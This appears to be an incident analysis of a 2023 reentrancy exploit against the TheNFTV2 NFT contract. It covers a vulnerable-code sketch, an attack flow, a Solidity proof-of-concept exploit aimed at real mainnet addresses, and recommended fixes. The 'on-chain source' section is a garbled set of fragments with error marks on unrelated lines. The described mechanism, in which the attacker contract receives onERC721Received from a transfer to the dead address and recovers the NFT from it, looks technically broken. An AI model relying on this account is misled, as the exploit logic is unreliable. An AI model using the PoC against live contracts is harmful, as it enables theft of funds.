# TheNFTV2 Reentrancy Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | TheNFTV2 |
| Date | 2023-11-29 |
| Chain | Ethereum Mainnet |
| Loss | ~$19,000 USD |
| Attack Type | Flash Swap + NFT burn/transfer Reentrancy |
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Attacker Address | `0x2F746bC70f72aAF3340B8BbFd254fd91a3996218` |
| Attack Contract | `0x85301f7b943fd132c8dbc33f8fd9d77109a84f28` |
| Vulnerable Contract | `0x79a7D3559D73EA032120A69E59223d4375DEb595` (TheNFTV2 ERC721) |
| Fork Block | 18,647,450 |

## 2. Vulnerable Code Analysis

TheNFTV2 provided a mechanism to exchange ERC721 NFTs for TheDAO tokens. The `burn()` function did not update state before the ERC721 transfer, allowing reentrancy via the `onERC721Received` callback. The attacker secured funds via a flash swap and repeatedly burned/transferred NFTs to receive more TheDAO tokens than the number of NFTs actually held.

```solidity
// Vulnerable pattern: reentrancy possible in burn()
contract TheNFTV2 {
    mapping(uint256 => address) public tokenOwners;
    IERC20 public theDAO;

    function burn(uint256 tokenId) external {
        require(tokenOwners[tokenId] == msg.sender, "Not owner");

        // Vulnerable: external call (including NFT transfer) before state update
        _transfer(msg.sender, address(0xdead), tokenId);
        // onERC721Received callback can occur inside the above _transfer

        // State update happens after the external call
        tokenOwners[tokenId] = address(0);

        // TheDAO payout
        theDAO.transfer(msg.sender, calculateReward(tokenId));
    }
}
```

**Vulnerability**: When `burn()` transfers the NFT to the dead address, the `onERC721Received` callback fires. If `burn()` is called again from within that callback, `tokenOwners[tokenId]` has not yet been cleared, allowing the same NFT to be burned multiple times and TheDAO tokens to be double-claimed.

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: TheNFT.sol
    function safeTransferFrom(  // ❌

// ...

    function transferFrom(  // ❌

// ...

    function safeTransferFrom(  // ❌

// ...

    function transfer(address recipient, uint256 amount) external returns (bool);  // ❌

// ...

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);  // ❌
```

```solidity
// File: TheNFTv2.sol
     * @dev Restore is fired when a token is restored from the burn  // ❌

// ...

     * @dev OwnershipTransferred is fired when a curator is changed  // ❌

// ...

    event OwnershipTransferred(address previousOwner, address newOwner);  // ❌

// ...

    function transferFrom(address,address,uint256) external;  // ❌

// ...

    function burn(uint256) external;  // ❌
```

## 3. Attack Flow

```
Attacker [0x2F746bC70f72aAF3340B8BbFd254fd91a3996218]
  │
  ├─1─▶ Attacker → transferFrom NFT (ID 1071) to TheNFTV2
  │      Transfer NFT to attack contract
  │
  ├─2─▶ Uniswap V2 Pair.swap(0, amount, address(this), data)
  │      Borrow TheDAO tokens via flash swap
  │      Triggers uniswapV2Call callback
  │
  ├─3─▶ Inside uniswapV2Call:
  │      a. TheNFTV2 NFT.approve(address(this), tokenId)
  │      b. Repeat TheNFTV2.burn(tokenId):
  │           burn() → _transfer(to dead) → onERC721Received callback
  │           In callback: recover NFT from dead address via transferFrom
  │           Call burn() again → duplicate burn → double TheDAO claim
  │
  ├─4─▶ Check TheDAO balance
  │      [TheDAO: 0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413]
  │
  ├─5─▶ Transfer TheDAO → Uniswap Pair (repay flash swap)
  │
  └─6─▶ WETH.withdraw() + ~$19,000 profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ITheNFTV2 {
    function burn(uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract TheNFTV2Exploit {
    ITheNFTV2 nft = ITheNFTV2(0x79a7D3559D73EA032120A69E59223d4375DEb595);
    IERC20 theDAO = IERC20(0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413);
    IUniswapV2Pair pair;
    uint256 targetTokenId = 1071;
    uint256 burnCount;

    function exploit() external {
        // Transfer NFT to this contract
        nft.transferFrom(msg.sender, address(this), targetTokenId);
        // Initiate flash swap
        pair.swap(0, theDAO.balanceOf(address(pair)) * 90 / 100, address(this), abi.encode(1));
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        // Repeatedly call burn
        burnCount = 0;
        nft.burn(targetTokenId);

        // Repay flash swap
        theDAO.transfer(address(pair), theDAO.balanceOf(address(this)) * 1004 / 1000);
    }

    // ERC721 callback: invoked during burn()
    function onERC721Received(address, address from, uint256 tokenId, bytes calldata)
        external returns (bytes4)
    {
        if (burnCount < 5 && from == address(0xdead)) {
            // Recover NFT from dead address (state not yet updated)
            nft.transferFrom(address(0xdead), address(this), tokenId);
            burnCount++;
            nft.burn(tokenId); // Reenter: duplicate burn
        }
        return this.onERC721Received.selector;
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Vulnerability Type | ERC721 burn() reentrancy, duplicate burn via onERC721Received callback |
| Impact Scope | TheNFTV2 TheDAO reward pool |
| Explorer | [Etherscan](https://etherscan.io/address/0x79a7D3559D73EA032120A69E59223d4375DEb595) |

## 6. Security Recommendations

```solidity
// Fix 1: CEI pattern + ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract TheNFTV2 is ReentrancyGuard {
    function burn(uint256 tokenId) external nonReentrant {
        require(tokenOwners[tokenId] == msg.sender, "Not owner");

        // Effects first
        tokenOwners[tokenId] = address(0);
        uint256 reward = calculateReward(tokenId);

        // Interactions last
        _burn(tokenId); // Burn directly without transferring to dead address
        theDAO.transfer(msg.sender, reward);
    }
}

// Fix 2: Use _burn() (internal burn instead of transfer to dead address)
function burn(uint256 tokenId) external {
    require(ownerOf(tokenId) == msg.sender);
    uint256 reward = calculateReward(tokenId);
    _burn(tokenId); // ERC721 standard _burn — does not invoke onERC721Received
    theDAO.transfer(msg.sender, reward);
}
```

## 7. Lessons Learned

1. **ERC721 burn reentrancy**: Transferring an NFT to `address(0xdead)` can trigger the recipient's `onERC721Received`. NFT burning should always use the internal `_burn()` method or apply `nonReentrant`.
2. **NFT-to-token exchange contracts**: Mechanisms that burn NFTs and pay out tokens are especially vulnerable to reentrancy via ERC721 callbacks. The CEI pattern and reentrancy guards are mandatory.
3. **The dead address trap**: The `0xdead` address may itself be a contract, or situations may arise where NFTs sent there can be recovered via `transferFrom`. For true burning, transfer to `address(0)` or use `_burn()`.
4. **$19K NFT reentrancy**: Even small-scale NFT projects become reentrancy targets if they include a token reward mechanism.